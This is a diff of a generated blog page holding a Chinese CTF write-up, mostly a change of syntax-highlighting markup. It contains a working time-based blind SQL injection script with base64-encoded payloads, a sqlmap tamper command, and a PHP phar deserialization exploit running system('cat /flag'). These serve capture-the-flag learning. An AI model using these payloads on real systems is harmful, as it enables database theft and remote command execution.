@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      649 字
+      746 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      20
+      12
        分钟
     </span>
   
@@ -245,6 +238,12 @@
             <!-- SEO header -->
             <h1 style="display: none">海洋大学CTF</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="合成大晦气"><a href="#合成大晦气" class="headerlink" title="合成大晦气"></a>合成大晦气</h2><p>js里找到flag    </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/736d3094cd3cbd89.png" srcset="/img/loading.gif">      </p>
@@ -252,76 +251,76 @@
 <p>sql注入，不过这道题对username和password进行base64编码；抓包后万能密码得到flag    </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/38a0b2749921b598.png" srcset="/img/loading.gif">        </p>
 <h2 id="Deep♂Dark♂Database"><a href="#Deep♂Dark♂Database" class="headerlink" title="Deep♂Dark♂Database"></a>Deep♂Dark♂Database</h2><p>上一道题的环境，不过还有flag，应该在数据库里；最简单的时间盲注，什么也没过滤   </p>
-<pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">import</span> base64
-<span class="token keyword">import</span> datetime
+<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> datetime
 
-url<span class="token operator">=</span><span class="token string">'http://39.106.29.44:10424/'</span>
+url=<span class="hljs-string">&#x27;http://39.106.29.44:10424/&#x27;</span>
 
-flag<span class="token operator">=</span><span class="token string">''</span>
+flag=<span class="hljs-string">&#x27;&#x27;</span>
 
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s<span class="token operator">=</span><span class="token number">30</span>
-    l<span class="token operator">=</span><span class="token number">127</span>
-    mid<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token operator">+</span>l<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
-    <span class="token keyword">while</span><span class="token punctuation">(</span>s<span class="token operator">&lt;</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token comment">#payload="1' or if((ascii(substr(database(),&#123;&#125;,1))>&#123;&#125;),sleep(5),1)#".format(i,mid)</span>
-        <span class="token comment">#payload="1' or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctf'),&#123;&#125;,1))>&#123;&#125;),sleep(5),1)#".format(i,mid)</span>
-        <span class="token comment">#payload="1' or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='user'),&#123;&#125;,1))>&#123;&#125;),sleep(5),1)#".format(i,mid)</span>
-        payload<span class="token operator">=</span><span class="token string">"1' or if((ascii(substr((select flag from ctf.flag limit 0,1),&#123;&#125;,1))>&#123;&#125;),sleep(5),1)#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
-        pay<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-        payl<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"YWRtaW4="</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span>payl<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
-        time1<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        re<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
-        time2<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        tem<span class="token operator">=</span><span class="token punctuation">(</span>time2<span class="token operator">-</span>time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds
-        <span class="token keyword">if</span><span class="token punctuation">(</span>tem<span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            s<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            l<span class="token operator">=</span>mid
-        mid<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token operator">+</span>l<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
-    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></code></pre>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">80</span>):
+    s=<span class="hljs-number">30</span>
+    l=<span class="hljs-number">127</span>
+    mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span>(s&lt;l):
+        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>
+        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>
+        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>
+        payload=<span class="hljs-string">&quot;1&#x27; or if((ascii(substr((select flag from ctf.flag limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
+        pay=base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
+        payl=<span class="hljs-built_in">str</span>(pay)
+        print(payload)
+        data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:payl[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]&#125;
+        time1=datetime.datetime.now()
+        re=requests.post(url=url,data=data)
+        time2=datetime.datetime.now()
+        tem=(time2-time1).seconds
+        <span class="hljs-keyword">if</span>(tem&gt;<span class="hljs-number">3</span>):
+            s=mid+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            l=mid
+        mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>
+    flag+=<span class="hljs-built_in">chr</span>(mid)
+    print(flag)</code></pre></div></code></pre>
 <p>或者直接sqlmap也可，sqlmap里有对payload进行base64编码的tamper；我还傻傻的写了个     </p>
 <p><code>sqlmap -r post.txt -tamper=base64encode --dbs</code>     </p>
 <p>得到的flag  </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/4b21694a0b481003.png" srcset="/img/loading.gif">     </p>
 <p>hex解码–&gt;base64解码—&gt;<code>flag&#123;U_fffxnd_an0th3r&#125;</code>      </p>
 <h2 id="CheckIn-Web"><a href="#CheckIn-Web" class="headerlink" title="CheckIn_Web"></a>CheckIn_Web</h2><p>代码审计     </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'secret.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$iipp</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$filePath</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'./uploads/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$iipp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$filePath_2</span> <span class="token operator">=</span> <span class="token variable">$filePath</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/test.txt'</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'write'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;secret.php&#x27;</span>);
+    $iipp = $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];
+    $filePath = <span class="hljs-string">&#x27;./uploads/&#x27;</span>.md5($iipp);
+    $filePath_2 = $filePath.<span class="hljs-string">&#x27;/test.txt&#x27;</span>;
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))
+    &#123;
+        <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;write&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]))&#123;
 
-            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
-                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
-            <span class="token punctuation">&#125;</span>
-            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filePath_2</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="hljs-keyword">if</span>(!file_exists($filePath))&#123; 
+                mkdir($filePath);    
+            &#125;
+            $res = file_put_contents($filePath_2, base64_decode(($_POST[<span class="hljs-string">&#x27;content&#x27;</span>])));
 
-            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"Successful!"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" your path is "</span><span class="token punctuation">.</span><span class="token variable">$filePath_2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'check'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filepath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filepath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'yes'</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'no'</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
+            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Successful!&quot;</span>.<span class="hljs-string">&quot; your path is &quot;</span>.$filePath_2);
+        &#125;
+        <span class="hljs-keyword">elseif</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;check&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>])) &#123;
+            <span class="hljs-keyword">if</span>(file_exists($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>]))&#123;
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;
+            &#125;
+            <span class="hljs-keyword">else</span>&#123;
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;
+            &#125;
+        &#125;
+        <span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);
+        &#125;
 
-    <span class="token punctuation">&#125;</span>
+    &#125;
 
-<span class="token delimiter important">?></span></span> </code></pre></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>感觉没啥可利用的，写入也是写进<code>txt</code>文件<br>有个<code>secret.php</code>但直接访问什么也没有，不会了  </p>
 <p>在同学的提示下扫了下目录，这种代码审计题要扫目录是我没想到的，发现有git泄露     </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/e702e3223ebaadad.png" srcset="/img/loading.gif">     </p>
@@ -332,30 +331,30 @@ flag<span class="token operator">=</span><span class="token string">''</span>
 <p><code>phar://</code>反序列化     </p>
 <p>源码中<code>elseif</code>中的<code>file_exists</code>支持phar协议；所以传入<code>filepath=phar://+文件路径</code>即可     </p>
 <p>生成phar文件      </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token double-quoted-string string">"system('cat /flag');"</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;
+        <span class="hljs-keyword">public</span> $cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;
+&#125;
+$a=<span class="hljs-keyword">new</span> TestObject();
 
 
-<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//.phar文件</span>
-<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//固定的</span>
-<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//触发的头是C1e4r类，所以传入C1e4r对象</span>
-<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//随便写点什么生成个签名</span>
-<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp2.phar&quot;</span>); <span class="hljs-comment">//.phar文件</span>
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//固定的</span>
+$phar-&gt;setMetadata($a); <span class="hljs-comment">//触发的头是C1e4r类，所以传入C1e4r对象</span>
+$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//随便写点什么生成个签名</span>
+$phar-&gt;stopBuffering();
 
-<span class="token delimiter important">?></span></span></code></pre></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>因为phar文件中有一些不可见字符，不能直接复制粘贴进行base64编码    </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-<span class="token variable">$path</span><span class="token operator">=</span><span class="token single-quoted-string string">'exp.phar'</span><span class="token punctuation">;</span>
-<span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//以二进制打开文件</span>
-<span class="token variable">$content</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//读取文件</span>
-<span class="token variable">$content</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+$path=<span class="hljs-string">&#x27;exp.phar&#x27;</span>;
+$fp=fopen($path,<span class="hljs-string">&#x27;rb&#x27;</span>);<span class="hljs-comment">//以二进制打开文件</span>
+$content=fread($fp,filesize($path));  <span class="hljs-comment">//读取文件</span>
+$content=base64_encode($content);
 
-<span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span></span></code></pre></code></pre>
+<span class="hljs-keyword">echo</span> $content;</code></pre></div></code></pre>
 <p>上传    </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/1e37b0a8f12043a0.png" srcset="/img/loading.gif">      </p>
 <p>访问     </p>
@@ -493,7 +492,7 @@ flag<span class="token operator">=</span><span class="token string">''</span>
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -519,8 +518,6 @@ flag<span class="token operator">=</span><span class="token string">''</span>
 
 
 
-  
-    
   
 
 
